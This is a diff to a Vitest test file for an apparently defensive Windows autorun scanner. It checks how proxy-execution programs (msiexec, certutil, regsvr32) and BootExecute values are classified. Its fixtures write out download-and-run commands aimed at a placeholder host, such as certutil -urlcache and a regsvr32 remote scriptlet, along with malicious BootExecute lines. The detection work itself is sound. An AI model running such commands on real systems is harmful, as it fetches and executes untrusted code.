@@ -1,3 +1,5 @@
+import { readFileSync } from 'node:fs';
+import { fileURLToPath } from 'node:url';
 import { describe, expect, it } from 'vitest';
 import {
   ACTIONS,
@@ -5,12 +7,17 @@ import {
   AUTORUN_CATEGORIES,
   autorunCounts,
   autorunIssues,
+  bootExecuteKind,
   categoryLabel,
   categoryLower,
   categoryShort,
   consumerLabel,
+  documentParts,
   entryFile,
   interpretedInline,
+  isDefaultShell,
+  isDefaultUserinit,
+  isInterpreter,
   METRICS,
   renderText,
   sourceLabel,
@@ -18,7 +25,7 @@ import {
   triggerLabel,
 } from '../src/engine';
 import type { AutorunEntry, FileFacts, FolderKind, Scan, SignatureStatus } from '../src/engine';
-import { bootExecuteKind, isDefaultShell, isDefaultUserinit } from '../src/engine/autoruns';
+import { INTERPRETERS } from '../src/engine/autoruns';
 import { clinicScan } from '../src/demo/clinic';
 import { demoScan } from '../src/demo/sample';
 import { guideById } from '../src/guides';
@@ -64,6 +71,19 @@ describe('etichette in italiano', () => {
     expect(entryFile(e)).toBe(dll);
     expect(interpretedInline(e)).toBe(false);
     expect(interpretedInline(entry('logon', 'y', ms('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe')))).toBe(true);
+    // Gli altri programmi di Windows che eseguono codice ricevuto (MITRE T1218, LOLBAS), come l'agente.
+    for (const p of ['C:\\Windows\\System32\\msiexec.exe', 'C:\\Windows\\System32\\certutil.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\explorer.exe', 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe', 'C:\\Windows\\System32\\wbem\\WMIC.exe', 'C:\\Windows\\System32\\register-cimprovider.exe'])
+      expect(interpretedInline(entry('logon', 'z', ms(p))), p).toBe(true);
+    expect(isInterpreter(ms('C:\\Windows\\System32\\SecurityHealthSystray.exe'))).toBe(false);
+  });
+
+  it('i programmi che eseguono altro codice sono gli stessi dell\'agente (proxies in resolve.go)', () => {
+    const go = readFileSync(fileURLToPath(new URL('../../windows/internal/autoruns/resolve.go', import.meta.url)), 'utf8');
+    const block = /var proxies = map\[string\]bool\{([\s\S]*?)\n\}/.exec(go);
+    expect(block, 'proxies in resolve.go').not.toBeNull();
+    const names = (block![1].match(/"([^"]+)":\s*true/g) || []).map((x) => x.replace(/"([^"]+)".*/, '$1') + '.exe');
+    expect(names.length).toBe(42);
+    expect(INTERPRETERS.slice().sort()).toEqual(names.sort());
   });
 });
 
@@ -112,6 +132,34 @@ describe('voci da guardare', () => {
       ['Script', 'unsigned', 'info'],
       ['Rundll', 'unsigned', 'warn'],
     ]);
+  });
+
+  it('comandi eseguiti dagli altri programmi di Windows (msiexec, certutil, explorer...): da conoscere, non voci di Microsoft', () => {
+    expect(
+      issues([
+        // Collegamento di un'app dello Store nella cartella Esecuzione automatica: elencato e 'info', come dice l'agente.
+        entry('logon', 'Calcolatrice', ms('C:\\Windows\\explorer.exe'), { command: 'explorer.exe shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App' }),
+        entry('tasks', 'Installa', ms('C:\\Windows\\System32\\msiexec.exe'), { command: 'msiexec.exe /i https://example.invalid/x.msi /qn', runAs: 'system' }),
+        entry('services', 'Scarica', ms('C:\\Windows\\System32\\certutil.exe'), { command: 'certutil -urlcache -f https://example.invalid/a a.exe', start: 'auto', account: 'system' }),
+        entry('logon', 'Registra', ms('C:\\Windows\\System32\\regsvr32.exe'), { command: 'regsvr32 /s /n /u /i:https://example.invalid/x.sct scrobj.dll' }),
+        // Lo stesso programma con il file eseguito noto: conta quel file (qui firmato e in Programmi, nulla da dire).
+        entry('logon', 'ConFile', ms('C:\\Windows\\System32\\msiexec.exe'), { target: file('C:\\Program Files\\Acme\\a.dll', 'programFiles', 'valid', 'Acme') }),
+        // Un programma di Windows che non esegue altro codice resta una voce di Microsoft.
+        entry('logon', 'Sicurezza', ms('C:\\Windows\\System32\\SecurityHealthSystray.exe')),
+      ]),
+    ).toEqual([
+      ['Calcolatrice', 'unsigned', 'info'],
+      ['Installa', 'tasks', 'info'],
+      ['Scarica', 'unsigned', 'info'],
+      ['Registra', 'unsigned', 'info'],
+    ]);
+    const why = autorunIssues(withAutoruns([entry('tasks', 'Installa', ms('C:\\Windows\\System32\\msiexec.exe'))]))[0].why;
+    expect(why).toContain('comando eseguito da msiexec.exe');
+    // msiexec, explorer e gli altri non sono interpreti: il testo non li chiama così.
+    expect(why).not.toContain('interprete');
+    const calc = withAutoruns([entry('logon', 'Calcolatrice', ms('C:\\Windows\\explorer.exe'), { command: 'explorer.exe shell:AppsFolder\\X!App' })]);
+    expect(find(calc, 'pc.autoruns.unsigned')?.verdict).toContain('Calcolatrice (comando eseguito da explorer.exe: la firma di Microsoft di questo programma di Windows non dice nulla');
+    expect(find(calc, 'pc.autoruns.unsigned')?.verdict).not.toContain('interprete');
   });
 
   it('dirottamenti noti: Shell, Userinit, IFEO, BootExecute, AppInit, LSA e stampa', () => {
@@ -258,7 +306,15 @@ describe('regole dell\'agente rifatte nel motore', () => {
     // Controllo del disco programmato da Windows su un volume (chkdsk al riavvio): al massimo informazione.
     for (const v of ['autocheck autochk /p \\??\\C:', 'autocheck autochk /r \\??\\D:', 'autocheck autochk /m \\DosDevices\\E:', 'autocheck autochk \\??\\Volume{1b2c3d4e-0000-0000-0000-100000000000}']) expect(bootExecuteKind(v), v).toBe('scheduled');
     // Tutto il resto non è di Windows.
-    for (const v of ['autocheck autochk * evil.exe', 'autocheck evil', 'autochk *', 'autocheck autochk', 'autocheck autochk /q', '']) expect(bootExecuteKind(v), v).toBe('other');
+    for (const v of ['autocheck autochk * evil.exe', 'autocheck evil', 'autochk *', 'autocheck autochk', 'autocheck autochk /q', '', 'autocheck autochk \\??\\C:\\evil.exe', 'autocheck autochk ** ']) expect(bootExecuteKind(v), v).toBe('other');
+    // Un'opzione con valore (/x:valore, decisione 2) resta un'opzione: il valore è un argomento di autochk, non un programma da avviare.
+    expect(bootExecuteKind('autocheck autochk /x:C:\\evil.exe *')).toBe('default');
+    // Spazi di ogni tipo (\s di JavaScript, che l'agente imita), volumi in maiuscolo, opzioni con cifre.
+    for (const v of ['autocheck autochk /x /r2 *', 'autocheck\tautochk\u00a0*', 'autocheck autochk\ufeff*']) expect(bootExecuteKind(v), JSON.stringify(v)).toBe('default');
+    expect(bootExecuteKind('AUTOCHECK AUTOCHK \\DOSDEVICES\\E: \\??\\VOLUME{1B2C3D4E-0000-0000-0000-100000000000}')).toBe('scheduled');
+    // U+0085 non è uno spazio per \s; «ſ» e il segno del kelvin non sono «s» e «k» per /i senza u.
+    for (const v of ['autocheck autochk \u0085*', 'autocheck autochk \\??\\C', 'autocheck autochk /: *', 'autocheck autochk /x: *', 'autocheck autochk /\u017f *', 'autocheck autochk \\??\\\u212a: *'])
+      expect(bootExecuteKind(v), JSON.stringify(v)).toBe('other');
     const list = (cmds: string[]) => issues(cmds.map((command, i) => entry('hijacks', `BootExecute${i}`, ms('C:\\Windows\\System32\\autochk.exe'), { kind: 'bootexecute', command })));
     expect(list(['autocheck autochk /q /v *', 'autocheck autochk /k:C *'])).toEqual([]);
     expect(list(['autocheck autochk /p \\??\\C:', 'autocheck autochk /r \\??\\D:'])).toEqual([
@@ -267,6 +323,41 @@ describe('regole dell\'agente rifatte nel motore', () => {
     ]);
     expect(autorunIssues(withAutoruns([entry('hijacks', 'BootExecute', undefined, { kind: 'bootexecute', command: 'autocheck autochk /r \\??\\D:' })]))[0].why).toContain('controllo del disco programmato');
     expect(list(['autocheck autochk * evil.exe', 'autocheck evil', 'autochk *']).map((x) => x[2])).toEqual(['warn', 'warn', 'warn']);
+  });
+
+  it('BootExecute: gli esempi di TestBootExecuteDefault (registry_test.go) danno lo stesso esito nei due linguaggi', () => {
+    const go = readFileSync(fileURLToPath(new URL('../../windows/internal/autoruns/registry_test.go', import.meta.url)), 'utf8');
+    const fn = /func TestBootExecuteDefault\(t \*testing\.T\) \{([\s\S]*?)\n\}/.exec(go);
+    expect(fn, 'TestBootExecuteDefault in registry_test.go').not.toBeNull();
+    // Righe della tabella: {riga, def, scheduled}; le stringhe Go tra virgolette usano solo escape validi anche in JSON.
+    const re = /\{(`[^`]*`|"(?:[^"\\]|\\.)*"), (true|false), (true|false)\}/g;
+    const cases: { line: string; kind: string }[] = [];
+    for (let m = re.exec(fn![1]); m; m = re.exec(fn![1]))
+      cases.push({ line: m[1].charAt(0) === '`' ? m[1].slice(1, -1) : (JSON.parse(m[1]) as string), kind: m[2] === 'true' ? (m[3] === 'true' ? 'scheduled' : 'default') : 'other' });
+    expect(cases.length).toBeGreaterThanOrEqual(27);
+    for (const c of cases) expect(bootExecuteKind(c.line), JSON.stringify(c.line)).toBe(c.kind);
+    // E gli esempi del motore (decisione 2) sono anche nella prova Go.
+    const lines = cases.map((c) => c.line);
+    for (const v of [
+      'autocheck autochk *',
+      'autocheck autochk /q /v *',
+      'AUTOCHECK  autochk   *',
+      'autocheck autochk /k:C *',
+      'autocheck autochk /x:C:\\evil.exe *',
+      'autocheck autochk /p \\??\\C:',
+      'autocheck autochk /r \\??\\D:',
+      'autocheck autochk /m \\DosDevices\\E:',
+      'autocheck autochk \\??\\Volume{1b2c3d4e-0000-0000-0000-100000000000}',
+      'autocheck autochk * evil.exe',
+      'autocheck evil',
+      'autochk *',
+      'autocheck autochk',
+      'autocheck autochk /q',
+      '',
+      'autocheck autochk \\??\\C:\\evil.exe',
+      'autocheck autochk ** ',
+    ])
+      expect(lines, JSON.stringify(v)).toContain(v);
   });
 
   it('Shell e Userinit: solo i programmi di Windows nella loro cartella, senza argomenti (come l\'agente)', () => {
@@ -334,10 +425,15 @@ describe('regole dell\'agente rifatte nel motore', () => {
       ['SvcDati', 'unsigned', 'crit'],
       ['SvcAccount', 'unsigned', 'warn'],
     ]);
-    // Account non letto: non si presume LocalSystem.
-    const why = autorunIssues(withAutoruns([entry('services', 'SvcAccount', file('C:\\ProgramData\\xyz\\svc2.exe', 'programData', 'unsigned'), { start: 'auto' })]))[0].why;
-    expect(why).toContain('account non letto');
-    expect(why).not.toContain('LocalSystem');
+    // Account non letto: non si presume LocalSystem (decisione 4), né assente né vuoto.
+    for (const account of [undefined, '' as AutorunEntry['account']]) {
+      const s = withAutoruns([entry('services', 'SvcAccount', file('C:\\ProgramData\\xyz\\svc2.exe', 'programData', 'unsigned'), { start: 'auto', account })]);
+      const why = autorunIssues(s)[0].why;
+      expect(why).toContain('account non letto');
+      expect(why).not.toMatch(/LocalSystem|privilegi di sistema/);
+      expect(renderText(s, analyze(s), { verbose: true })).not.toContain('LocalSystem');
+      expect(documentParts(s, analyze(s)).body).not.toContain('LocalSystem');
+    }
   });
 
   it('estensioni imposte da criteri fuori da un dominio: normali con Intune o Entra ID, altrimenti da riconoscere', () => {
@@ -361,8 +457,41 @@ describe('giudizi e categorie da verificare', () => {
     expect(find(denied, 'pc.autoruns.wmi')).toMatchObject({ severity: 'unknown', value: 'da verificare da amministratore' });
     const uns = find(denied, 'pc.autoruns.unsigned');
     expect(uns?.severity).toBe('info');
-    expect(uns?.verdict).toContain('servizi: si leggono solo in parte senza amministratore');
+    expect(uns?.verdict).toContain('Servizi: si leggono solo in parte senza amministratore');
     for (const f of analyze(denied).findings.filter((x) => x.id.startsWith('pc.autoruns'))) expect(f.verdict, f.id).not.toMatch(/nessun problema/i);
+  });
+
+  it('attività negate da amministratore: protette, da guardare in Utilità di pianificazione (B10)', () => {
+    const protectedText = 'Alcune attività non si sono potute leggere (protette): da guardare in Utilità di pianificazione';
+    const userText = 'Senza amministratore si vedono solo le attività leggibili';
+    const task = entry('tasks', 'Aggiornatore', file(appData('upd.exe'), 'appData', 'valid', 'Acme'));
+    // Con voci da conoscere.
+    const admin = find(withAutoruns([task], { denied: ['tasks'], elevated: true }), 'pc.autoruns.tasks');
+    expect(admin?.verdict).toContain(protectedText);
+    expect(admin?.verdict).not.toContain(userText);
+    expect(find(withAutoruns([task], { denied: ['tasks'] }), 'pc.autoruns.tasks')?.verdict).toContain(userText);
+    // Senza voci da segnalare: mai «da verificare da amministratore» se lo si è già.
+    const empty = find(withAutoruns([], { denied: ['tasks'], elevated: true }), 'pc.autoruns.tasks');
+    expect(empty).toMatchObject({ severity: 'unknown', value: 'alcune attività protette non lette' });
+    expect(empty?.verdict).toContain(protectedText);
+    expect(empty?.verdict).not.toMatch(/amministratore:|da verificare da amministratore/);
+    expect(find(withAutoruns([], { denied: ['tasks'] }), 'pc.autoruns.tasks')).toMatchObject({ severity: 'unknown', value: 'da verificare da amministratore' });
+    expect(find(withAutoruns([], { denied: ['tasks'] }), 'pc.autoruns.tasks')?.verdict).toContain('Senza amministratore si vedono solo le attività pianificate leggibili');
+    // Lo stesso per le altre categorie lette in parte, nel rapporto e nel documento.
+    const s = withAutoruns([], { denied: ['tasks', 'wmi', 'services'], elevated: true });
+    for (const f of analyze(s).findings.filter((x) => x.id.startsWith('pc.autoruns'))) {
+      expect(f.verdict, f.id).not.toMatch(/senza amministratore|da verificare da amministratore|avviando Polaris come amministratore/i);
+      expect(f.value, f.id).not.toContain('da verificare da amministratore');
+    }
+    expect(find(s, 'pc.autoruns.unsigned')?.verdict).toContain('con una firma alterata. Servizi: alcune voci non si sono potute leggere nemmeno da amministratore');
+    const txt = renderText(s, analyze(s)).replace(/\s+/g, ' ');
+    expect(txt).toContain('Lette solo in parte, voci protette anche da amministratore: attività pianificate, sottoscrizioni WMI, servizi');
+    expect(txt).not.toContain('Da verificare da amministratore');
+    const body = documentParts(s, analyze(s)).body;
+    expect(body).toContain('<b>Lette solo in parte, voci protette anche da amministratore:</b> attività pianificate');
+    expect(body).not.toContain('Da verificare da amministratore');
+    // La scala del giudizio comprende il caso da amministratore.
+    expect(METRICS['pc.autoruns.tasks'].scale!.find((x) => x.severity === 'unknown')!.meaning).toContain('Utilità di pianificazione');
   });
 
   it('demo: casa con estensione imposta da criteri e aggiornatore nascosto; clinica con il servizio dei referti', () => {
@@ -397,5 +526,13 @@ describe('giudizi e categorie da verificare', () => {
     const guide = JSON.stringify(guideById('avvio-automatico')!.blocks);
     expect(guide).toContain('sottoscrizioni WMI; estensioni dei browser; Winlogon; dirottamenti noti (IFEO, BootExecute, AppInit); pacchetti di sicurezza (LSA)');
     expect(guide).not.toMatch(/sottoscrizioni wmi|\(ifeo, bootexecute/);
+    // La guida segue il codice: elenco dei programmi che eseguono altro codice, BootExecute, Shell e Userinit, attività protette.
+    expect(guide).toContain(`Polaris riconosce ${INTERPRETERS.length} di questi programmi`);
+    expect(guide).toContain('explorer.exe shell:AppsFolder');
+    expect(guide).toContain('**controllo del disco programmato**');
+    expect(guide).toContain('\\\\DosDevices\\\\C:');
+    expect(guide).toContain('anche una cartella Windows su un altro disco');
+    expect(guide).toContain('con il file alterato dopo la firma');
+    expect(guide).toContain('Anche da amministratore alcune attività possono negare la lettura (protette)');
   });
 });
